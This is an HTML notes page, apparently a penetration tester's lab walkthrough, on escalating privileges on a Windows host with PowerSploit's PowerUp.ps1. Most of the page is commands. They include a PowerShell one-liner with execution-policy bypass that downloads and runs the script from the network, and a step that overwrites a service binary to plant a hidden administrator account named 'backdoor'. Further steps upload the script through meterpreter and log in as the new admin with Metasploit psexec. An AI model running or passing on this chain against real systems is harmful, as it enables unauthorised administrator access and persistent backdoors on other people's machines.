<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Create a new Admin User</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Create a new Admin User</h1><br /><strong>3. Run PowerUp.ps1 script and create a new Administrator
      account</strong> <br /> Site: <a
      href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a><br />
    *If we want we can also upload a payload(created with msfvenom) on the target machine<br /> ◇ <strong>Alternative 1:
      One-Line without download PowerUp.ps1 on the target machine &lt;---------</strong><br />
    <div class="codebox">
      <div class="codebox">
        C:\Users\danie\Desktop&gt;&nbsp;powershell.exe&nbsp;-exec&nbsp;bypass&nbsp;-Command&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&nbsp;&#39;);Invoke-AllChecks;Write-ServiceBinary&nbsp;-Name&nbsp;&#39;AxAutoMntSrv&#39;&nbsp;-Path&nbsp;&#39;C:\Program&nbsp;Files\Alcohol&nbsp;Soft\Alcohol.exe&#39;&nbsp;-UserName&nbsp;backdoor&nbsp;-Password&nbsp;Password123!
      </div>
    </div><br /> ◇ <strong>Alternative 2: Upload PowerUp.ps1 and run it with Powershell on the target
      machine</strong><br /> Download locally only the script file PowerUp.ps1 that we need<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/home/kali/Desktop#&nbsp;wget&nbsp;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
      </div>
    </div>
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;upload&nbsp;/home/kali/Desktop/PowerUp.ps1&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#upload&nbsp;PowerUp.ps1&nbsp;on&nbsp;the&nbsp;target&nbsp;machine&nbsp;in&nbsp;the&nbsp;current&nbsp;folder&nbsp;of&nbsp;the&nbsp;target&nbsp;machine&nbsp;(.)<br />meterpreter&nbsp;&gt;&nbsp;load&nbsp;powershell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#load&nbsp;powershell&nbsp;extension<br />meterpreter&nbsp;&gt;&nbsp;powershell_shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#run&nbsp;powershell<br />PS&nbsp;&gt;&nbsp;pwd<br />PS&nbsp;&gt;&nbsp;Import-Module&nbsp;.\PowerUp.ps1<br />PS&nbsp;&gt;&nbsp;invoke-AllChecks&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#runs&nbsp;all&nbsp;current&nbsp;escalation&nbsp;checks&nbsp;and&nbsp;returns&nbsp;a&nbsp;report<br />PS&nbsp;&gt;&nbsp;Write-ServiceBinary&nbsp;-Name&nbsp;&#39;AxAutoMntSrv&#39;&nbsp;-Path&nbsp;&#39;C:\Program&nbsp;Files\Alcohol&nbsp;Soft\Alcohol.exe&#39;&nbsp;-UserName&nbsp;backdoor&nbsp;-Password&nbsp;Password123!&nbsp;#add&nbsp;Alcohol.exe
      </div>
    </div><br /> This writes a file called C:\Program Files\Alcohol Soft\Alcohol.exe&#39; that will be run with
    LocalSystem privileges when the service restarts. <br /> Writing the malicious file won&#39;t interrupt the service
    if it&#39;s running, but when the service restarts, Windows will execute the malicious file instead of the
    legitimate file<br /> At the next restart of the service AxAutoMntMntSrv or at a restart of the target computer a
    new Administrator account will be created with the credential spcified:<br /> username: “backdoor”<br /> password:
    &quot;Password123!&quot;<br /> ◇ <strong>Alternative 3: Upload PowerUp.ps1 without start a shell
      Powershell</strong>: <br /> Download locally only the script file PowerUp.ps1 that we need<strong><br /> </strong>
    <div class="codebox">
      <div class="codebox">
        root@kali:/home/kali/Desktop#&nbsp;wget&nbsp;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
      </div>
    </div>
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;upload&nbsp;/home/kali/Desktop/PowerUp.ps1&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#upload&nbsp;PowerUp.ps1&nbsp;on&nbsp;the&nbsp;target&nbsp;machine&nbsp;in&nbsp;the&nbsp;current&nbsp;folder&nbsp;of&nbsp;the&nbsp;target&nbsp;machine&nbsp;(.)<br />meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;powershell.exe&nbsp;-exec&nbsp;bypass&nbsp;-Command&nbsp;&quot;&amp;&nbsp;{Import-Module&nbsp;.\PowerUp.ps1;&nbsp;Invoke-AllChecks}&quot;<br />C:\Users\danie\Desktop&gt;&nbsp;powershell.exe&nbsp;-exec&nbsp;bypass&nbsp;-Command&nbsp;&quot;&amp;&nbsp;{Import-Module&nbsp;.\PowerUp.ps1;Write-ServiceBinary&nbsp;-Name&nbsp;&#39;AxAutoMntSrv&#39;&nbsp;-Path&nbsp;&#39;C:\Program&nbsp;Files\Alcohol&nbsp;Soft\Alcohol.exe&#39;&nbsp;-UserName&nbsp;backdoor&nbsp;-Password&nbsp;Password123!}&quot;
      </div>
    </div><br /><br />4. We can restart the service, in this way the new Administrator “backdoor” is created<br />
    <div class="codebox">
      <div class="codebox">C:\Users\danie\Desktop&gt;&nbsp;sc&nbsp;start&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>service<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div> <br /> <span style="color:#a5452a;">example:</span><br /> To start the service as the login user we need that
    <span style="color:#ff0000;">CanRestart</span> on the PowerUp.ps1 output is “True”. In our scenario is False so we
    cannot do that, only for demonstration in the examples below we have started the service as Administrator. In a Real
    Testing anyway this wouldn&#39;t make much sense because become “Administrator” is our final purpose of this
    exploit!<br /> <code>sc start AxAutoMntSrv</code><br /><br /><strong>5. Check if the new account is been
      created</strong><br />
    <div class="codebox">
      <div class="codebox">C:\Users\danie\Desktop&gt;&nbsp;net&nbsp;localgroup&nbsp;Administrators</div>
    </div><br /> <a href=""><img src="images/1322-1.png" alt="images/1322-1.png" /></a><br /><br /><strong>6. To login
      now as Administrator &quot;backdoor&quot; user we can use</strong><br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/smb/psexec<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;192.168.1.120<br />msf&nbsp;&gt;&nbsp;set&nbsp;SMBPass&nbsp;Password123!<br />msf&nbsp;&gt;&nbsp;set&nbsp;SMBUser&nbsp;backdoor<br />msf&nbsp;&gt;&nbsp;run
      </div>
    </div><br /> <a href=""><img src="images/1322-2.png" alt="images/1322-2.png" /></a><br /><br /><strong>7. Clean Up
      (optional)</strong><br />
    <div class="codebox">
      <div class="codebox">del&nbsp;&quot;C:\Program&nbsp;Files\Alcohol&nbsp;Soft\Alcohol.exe&quot;</div>
    </div><br />
  </div>
</body>

</html>